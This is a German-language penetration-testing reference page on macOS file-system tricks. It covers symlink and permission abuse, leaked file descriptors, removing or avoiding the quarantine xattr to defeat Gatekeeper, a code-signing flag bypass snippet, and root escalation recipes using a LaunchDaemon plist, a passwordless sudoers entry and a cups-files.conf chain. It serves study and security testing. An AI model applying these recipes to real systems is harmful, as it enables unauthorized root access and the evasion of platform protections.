# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinationen von POSIX-Berechtigungen

Bei einem **Verzeichnis** bedeuten die drei Berechtigungsbits etwas anderes als bei einer regulären Datei. `chmod(1)` bezeichnet das Execute-Bit bei Anwendung auf ein Verzeichnis als "**search**":<sup>[[2]](#references)</sup>

> `0100` Bei Dateien die Ausführung durch den Besitzer erlauben. Bei Verzeichnissen dem Besitzer erlauben, im Verzeichnis zu **suchen**.

- **read** - Sie können die Verzeichniseinträge **aufzählen** (die Namen auflisten).
- **write** - Sie können Einträge im Verzeichnis **erstellen, umbenennen und löschen**. Beachten Sie, dass dies eine Eigenschaft des *enthaltenden* Verzeichnisses ist, nicht der Datei: Sie können eine Datei löschen, die Sie weder lesen noch beschreiben können, solange Sie in ihr übergeordnetes Verzeichnis schreiben können.
- Um ein **Unterverzeichnis** zu löschen, muss es leer sein, was wiederum ausreichende Berechtigungen erfordert, um alles darin zu entfernen.
- Wenn das Verzeichnis das **sticky bit** (`S_ISVTX`, wie `/tmp`) besitzt, ist dies eingeschränkt — POSIX legt fest, dass ein Prozess darin Dateien nur dann entfernen oder umbenennen darf, wenn er die Datei besitzt, das Verzeichnis besitzt oder über entsprechende Berechtigungen verfügt.<sup>[[1]](#references)</sup>
- **execute / search** - Sie dürfen das Verzeichnis **durchqueren**. Die Auflösung eines Pfadnamens findet jede Komponente "in dem von ihrem Vorgänger angegebenen Verzeichnis", sodass der Verlust der Suchberechtigung für eine einzelne Komponente des Pfadpräfixes alles darunter per Pfad unerreichbar macht, selbst wenn die Blattdatei selbst für alle lesbar ist.<sup>[[1]](#references)</sup>

### Gefährliche Kombinationen

**Wie man eine Datei/einen Ordner überschreibt, die/der root gehört**, wenn:

- Einer der übergeordneten **Verzeichnisbesitzer** im Pfad der Benutzer ist
- Einer der übergeordneten **Verzeichnisbesitzer** im Pfad eine **Benutzergruppe** mit **Schreibzugriff** ist
- Eine **Benutzergruppe** **Schreibzugriff** auf die **Datei** hat

Bei jeder der vorherigen Kombinationen könnte ein Angreifer einen **sym/hard link** in den erwarteten Pfad **injecten**, um einen privilegierten arbitrary write zu erhalten.

### Sonderfall: Ordner root R+X

Dies ergibt sich direkt aus der oben beschriebenen Regel zur Pfadnamensauflösung. Wenn ein **Verzeichnis nur root R+X gewährt**, sind die darin enthaltenen Dateien für alle anderen *per Pfad* unerreichbar — die **Berechtigungsbits der Dateien selbst können jedoch weiterhin permissiv sein**. Das Verzeichnis ist das einzige Hindernis.

Daher wird jede primitive Funktion, mit der die Datei **aus diesem Verzeichnis herausgebracht** werden kann — etwa ein privilegierter Prozess, der einen vom Angreifer gewählten Pfad an einen Ort **verschiebt/umbenennt/kopiert**, den Sie durchqueren können — zu einem arbitrary read, ohne jemals den eigenen Modus der Datei überwinden zu müssen:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Suche nach privilegierten Datei-Verschiebern (Installationsprogrammen, Log-Rotatoren, Crash-/Diagnosesammlern, Backup- und „Export“-Funktionen), die einen Quellpfad von einem Benutzer mit geringeren Rechten akzeptieren.

## Symbolic Link / Hard Link

### Freizügige Datei/Ordner

Wenn ein privilegierter Prozess Daten in eine **Datei** schreibt, die von einem **Benutzer mit geringeren Rechten** **kontrolliert** werden könnte oder die zuvor von einem Benutzer mit geringeren Rechten **erstellt** wurde. Der Benutzer könnte einfach über einen Symbolic oder Hard link **auf eine andere Datei verweisen**, und der privilegierte Prozess würde in diese Datei schreiben.

Prüfe die anderen Abschnitte, in denen ein Angreifer **einen beliebigen Schreibzugriff missbrauchen könnte, um seine Privilegien zu erweitern**.

### Open `O_NOFOLLOW`

Laut [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Wenn `O_NOFOLLOW` in der Maske verwendet wird und die an `open()` übergebene Zieldatei ein Symbolic link ist, schlägt `open()` fehl.“* Nur die **letzte** Komponente wird geprüft — jede **intermediäre** Komponente wird weiterhin aufgelöst und verfolgt. Daher kann ein Entwickler, der einen Schreibzugriff mit `O_NOFOLLOW` „geschützt“ hat, weiterhin angegriffen werden, indem ein Symlink in einem beliebigen **übergeordneten Verzeichnis** des Zielpfads platziert wird.<sup>[[3]](#references)</sup>

Dieselbe Manpage dokumentiert die Flags, die diese Lücke tatsächlich schließen:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *„wenn ... eine beliebige Komponente des an `open()` übergebenen Pfads ein Symbolic link ist, schlägt `open()` fehl.“*
- **`O_RESOLVE_BENEATH`** — *„wenn ... die angegebene Pfadauflösung aus dem mit dem fd verknüpften Verzeichnis herausführt, schlägt `openat()` fehl.“*

Andernfalls bleiben `openat()` relativ zu einem Directory-FD, den du bereits validiert hast, oder `realpath()` + erneute Validierung als Möglichkeiten, um Symlink-Austauschvorgänge in der Mitte des Pfads zu verhindern.

## .fileloc

Dateien mit der Erweiterung **`.fileloc`** können auf andere Anwendungen oder Binaries verweisen, sodass beim Öffnen die Anwendung/das Binary ausgeführt wird.\
Beispiel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Dateideskriptoren

### Leak FD (no `O_CLOEXEC`)

Wenn ein Aufruf von `open` nicht über das Flag `O_CLOEXEC` verfügt, wird der Dateideskriptor an den Kindprozess vererbt. Wenn also ein privilegierter Prozess eine privilegierte Datei öffnet und einen vom Angreifer kontrollierten Prozess ausführt, wird der Angreifer **den FD für die privilegierte Datei erben**.

Das kanonische Beispiel ist die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` berücksichtigte `DYLD_PRINT_TO_FILE=/path` sogar in **restricted (suid root) binaries**, da diese bestimmte Variable außerhalb von `processDyldEnvironmentVariable()` geparst wurde.
- Es führte `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` aus und **erstellte dadurch eine root-owned Datei an einem beliebigen Pfad**.
- Der FD wurde **niemals geschlossen und hatte kein close-on-exec-Flag**, sodass jeder Kindprozess des suid-Binary einen **beschreibbaren FD für eine root-owned Datei** erbte.
- Wenn man beispielsweise `DYLD_PRINT_TO_FILE=/etc/target suid_binary` ausführte und anschließend die Nummer des geerbten FDs im Kindprozess auslas, waren beliebige Schreibvorgänge in root-owned Dateien möglich; `fcntl(fd, F_SETFL, 0)` entfernte sogar `O_APPEND`, um Überschreiben statt Anhängen zu ermöglichen.

Dasselbe Muster tritt immer dann auf, wenn ein privilegierter Prozess eine Datei **vor** der Ausführung von etwas öffnet, das du kontrollierst (Helper-Tools, über `$EDITOR` aufgerufene Editoren im Stil von `crontab`, Log-/Debug-Dateien, die über einen Pfad aus einer Umgebungsvariable geöffnet werden ...). Liste die geerbten FDs mit folgendem Befehl auf:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Alles über `2`, das auf eine Datei verweist, die du nicht selbst öffnen kannst, ist eine Primitive für beliebiges Schreiben (oder beliebiges Lesen).

## Quarantine-xattrs-Tricks vermeiden

### Entfernen
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Wenn eine Datei/ein Ordner dieses immutable-Attribut hat, ist es nicht möglich, ein xattr darauf zu setzen.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Dateisysteme ohne xattr-Unterstützung

Nicht jedes Dateisystem, das macOS einbinden kann, speichert **erweiterte Attribute** nativ. HFS+ und APFS können dies; **FAT32, exFAT und (die meisten) NFS-Einhängungen können dies nicht** — macOS emuliert sie, indem es eine **AppleDouble**-Begleitdatei mit dem Namen `._<filename>` schreibt ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Das ist für Quarantine relevant, da das xattr nur erhalten bleibt, wenn es tatsächlich auf dasselbe Volume geschrieben **und von dort wieder gelesen** werden kann:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Wenn das Volume später über einen Pfad gelesen wird, der den `._`-Begleiter ignoriert (oder der Begleiter entfernt/gelöscht wurde), kommt die Datei **ohne Quarantine-Flag** an — und eine nicht unter Quarantäne stehende `.app` reicht aus, um die App Sandbox zu umgehen, wie in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) beschrieben.

### writeextattr ACL

Diese ACL verhindert das Hinzufügen von `xattrs` zur Datei
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Das **AppleDouble**-Dateiformat kopiert eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die im xattr namens **`com.apple.acl.text`** gespeicherte textuelle Darstellung der ACL als ACL in der dekomprimierten Datei festgelegt wird. Wenn Sie also eine Anwendung in eine ZIP-Datei im **AppleDouble**-Dateiformat mit einer ACL komprimiert haben, die verhindert, dass andere xattrs in sie geschrieben werden, wurde das Quarantäne-xattr nicht in der Anwendung gesetzt:

Weitere Informationen finden Sie im [**Originalbericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/).<sup>[[6]](#references)</sup>

Um dies zu reproduzieren, müssen wir zunächst den korrekten ACL-String ermitteln:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Beachte, dass die Sandbox selbst dann zuvor das Quarantäne-xattr schreibt, wenn dies funktioniert.)

Nicht wirklich erforderlich, aber ich lasse es für alle Fälle dort:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

Einige Sicherheitsprüfungen überprüfen, ob es sich bei der Binärdatei um eine **platform binary** handelt, beispielsweise um eine Verbindung zu einem XPC service zu erlauben. Wie jedoch in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ bei einem Bypass gezeigt wird, ist es möglich, diese Prüfung zu umgehen, indem man eine platform binary (wie /bin/ls) verwendet und den Exploit über dyld mithilfe der Umgebungsvariable `DYLD_INSERT_LIBRARIES` injiziert.<sup>[[7]](#references)</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

Eine ausgeführte Binärdatei kann ihre eigenen flags ändern, um Prüfungen mit Code wie dem folgenden zu umgehen:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash** jeder einzelnen **Datei** im **Bundle** enthält. Beachte, dass der Hash von CodeResources ebenfalls in der **Executable** eingebettet ist, sodass wir auch daran nichts ändern können.

Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird. Diese verfügen im plist über den Schlüssel `omit`, zum Beispiel:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es ist möglich, die Signatur einer Ressource über die CLI zu berechnen mit:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMGs mounten

Ein Benutzer kann ein benutzerdefiniertes DMG mounten, das sogar über einigen vorhandenen Ordnern erstellt wurde. So könntest du ein benutzerdefiniertes DMG-Paket mit benutzerdefinierten Inhalten erstellen:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Normalerweise mountet macOS Datenträger über den Mach-Dienst `com.apple.DiskArbitrarion.diskarbitrariond` (bereitgestellt von `/usr/libexec/diskarbitrationd`). Wenn der Parameter `-d` zur LaunchDaemons-plist-Datei hinzugefügt und der Dienst neu gestartet wird, werden die Logs in `/var/log/diskarbitrationd.log` gespeichert.\
Es ist jedoch möglich, Tools wie `hdik` und `hdiutil` zu verwenden, um direkt mit dem kext `com.apple.driver.DiskImages` zu kommunizieren.

## Beliebige Schreibvorgänge

### Periodische sh-Skripte

Wenn dein Skript als **Shell-Skript** interpretiert werden könnte, könntest du das **`/etc/periodic/daily/999.local`**-Shell-Skript überschreiben, das jeden Tag ausgeführt wird.

Du kannst eine **Ausführung** dieses Skripts mit folgendem Befehl **simulieren**: **`sudo periodic daily`**

### Daemons

Schreibe einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer plist, die ein beliebiges Skript ausführt, wie etwa:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Generiere einfach das Script `/Applications/Scripts/privesc.sh` mit den **Befehlen**, die du als root ausführen möchtest.

### Sudoers-Datei

Wenn du über **arbitrary write** verfügst, könntest du eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, die dir **sudo**-Berechtigungen gewährt.

### PATH-Dateien

Die Datei **`/etc/paths`** ist eine der wichtigsten Stellen, über die die PATH-Umgebungsvariable befüllt wird. Du musst root sein, um sie zu überschreiben. Wenn ein Script aus einem **privileged process** einen **Befehl ohne den vollständigen Pfad** ausführt, könntest du ihn möglicherweise **hijacken**, indem du diese Datei änderst.

Du kannst außerdem Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die PATH-Umgebungsvariable zu laden.

### cups-files.conf

Diese Technik wurde in [diesem writeup](https://www.kandji.io/blog/macos-audit-story-part1) verwendet.<sup>[[8]](#references)</sup>

Erstelle die Datei `/etc/cups/cups-files.conf` mit folgendem Inhalt:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Dadurch wird die Datei `/etc/sudoers.d/lpe` mit den Berechtigungen 777 erstellt. Der zusätzliche Inhalt am Ende dient dazu, die Erstellung des Fehlerprotokolls auszulösen.

Schreibe anschließend die erforderliche Konfiguration zur Eskalation der Berechtigungen, etwa `%staff ALL=(ALL) NOPASSWD:ALL`, in `/etc/sudoers.d/lpe`.

Ändere danach erneut die Datei `/etc/cups/cups-files.conf` und setze `LogFilePerm 700`, damit die neue sudoers-Datei durch den Aufruf von `cupsctl` gültig wird.

### Sandbox Escape

Es ist möglich, die macOS-Sandbox mit einem beliebigen FS-Schreibzugriff zu verlassen. Beispiele findest du auf der Seite [macOS Auto Start](../../../../macos-auto-start-locations.md). Eine häufige Methode besteht jedoch darin, eine Terminal-Einstellungsdatei unter `~/Library/Preferences/com.apple.Terminal.plist` zu schreiben, die beim Start einen Befehl ausführt, und sie mit `open` aufzurufen.

## Beschreibbare Dateien als andere Benutzer erstellen

Ein sehr häufig verwendbares privesc-Primitiv besteht darin, dass ein **privilegierter Prozess eine Datei für dich erstellt** — in einem Verzeichnis, das du kontrollierst — und du anschließend den **Schreibzugriff** auf diese Datei behältst. Dafür sind zwei Voraussetzungen erforderlich:

1. Ein Verzeichnis, dessen Eigentümer du bist (oder in dem du eine **vererbbare ACL** setzen kannst), sodass alles, was darin erstellt wird, deine Berechtigungen erbt.
2. Ein privilegierter/`suid`-Prozess, dem mitgeteilt werden kann, **wo** eine Datei erstellt werden soll — typischerweise über eine Debugging-/Logging-Umgebungsvariable, eine Konfigurationsdatei oder die XPC-API eines Helpers.

Der Teil mit der **vererbbaren ACL** sorgt dafür, dass die erstellte Datei für dich beschreibbar ist, obwohl sie einem anderen Benutzer gehört. Die Vererbungs-Flags `file_inherit` / `directory_inherit` sind in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) dokumentiert:<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Jetzt ist jede Datei, die ein privilegierter Prozess innerhalb von `$DIRNAME` erstellt, **für dich beschreibbar**. Wenn dieses Verzeichnis außerdem ein Ort ist, der später **als root ausgeführt** wird (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ein LaunchDaemon-Verzeichnis ...), führt dies direkt zu einer Root-Eskalation. Siehe die Abschnitte [Sudoers File](#sudoers-file) und [cups-files.conf](#cups-filesconf) weiter oben, um zu erfahren, was du schreiben musst, sobald du die Datei hast.

Ein vollständiges Beispiel für die Kette „Eine Umgebungsvariable veranlasst einen Root-Prozess, eine Datei zu erstellen, und der FD wird an dich weitergegeben“ findest du weiter oben unter [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## POSIX Shared Memory

**POSIX Shared Memory** ermöglicht es Prozessen in POSIX-konformen Betriebssystemen, auf einen gemeinsamen Speicherbereich zuzugreifen, wodurch eine schnellere Kommunikation als mit anderen Inter-Process-Communication-Methoden ermöglicht wird. Dabei wird mit `shm_open()` ein Shared-Memory-Objekt erstellt oder geöffnet, seine Größe mit `ftruncate()` festgelegt und es mithilfe von `mmap()` in den Adressraum des Prozesses eingebunden. Prozesse können anschließend direkt aus diesem Speicherbereich lesen und in ihn schreiben. Um den gleichzeitigen Zugriff zu verwalten und Datenkorruption zu verhindern, werden häufig Synchronisationsmechanismen wie Mutexes oder Semaphoren verwendet. Abschließend heben die Prozesse die Zuordnung des Shared Memory mit `munmap()` auf und schließen es mit `close()`; optional kann das Speicherobjekt mit `shm_unlink()` entfernt werden. Dieses System eignet sich besonders für effiziente, schnelle IPC- Kommunikation in Umgebungen, in denen mehrere Prozesse schnell auf gemeinsam genutzte Daten zugreifen müssen.

<details>

<summary>Beispiel für Producer-Code</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Codebeispiel für Consumer</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** sind eine in macOS eingeführte Sicherheitsfunktion, um die Sicherheit und Zuverlässigkeit von **file descriptor operations** in Benutzeranwendungen zu erhöhen. Diese guarded descriptors bieten eine Möglichkeit, bestimmte Einschränkungen oder „guards“ mit file descriptors zu verknüpfen, die vom Kernel erzwungen werden.

Diese Funktion ist besonders nützlich, um bestimmte Klassen von Sicherheitslücken wie **unauthorized file access** oder **race conditions** zu verhindern. Diese Sicherheitslücken treten beispielsweise auf, wenn ein Thread auf eine file description zugreift und dadurch einem **anderen verwundbaren Thread Zugriff darauf gewährt**, oder wenn ein file descriptor von einem **verwundbaren Child-Prozess geerbt** wird. Einige Funktionen im Zusammenhang mit dieser Funktionalität sind:

- `guarded_open_np`: Einen FD mit einem guard öffnen
- `guarded_close_np`: Ihn schließen
- `change_fdguard_np`: Guard-Flags eines Descriptors ändern (einschließlich des Entfernens des Guard-Schutzes)

## References

- [1] [POSIX.1-2024 — Basisdefinitionen, Kap. 4 (Dateizugriffsberechtigungen, Verzeichnisschutz, Auflösung von Pfadnamen)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)`-Manpage](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)`-Manpage](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Welche Dateisysteme und Cloud-Dienste erweiterten Attribute beibehalten](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeepers Achillesferse: Eine macOS-Sicherheitslücke aufgedeckt](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Eine neue Ära von macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Aufdeckung von Apple-Sicherheitslücken: Die Audit-Geschichte von diskarbitrationd und storagekitd, Teil 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
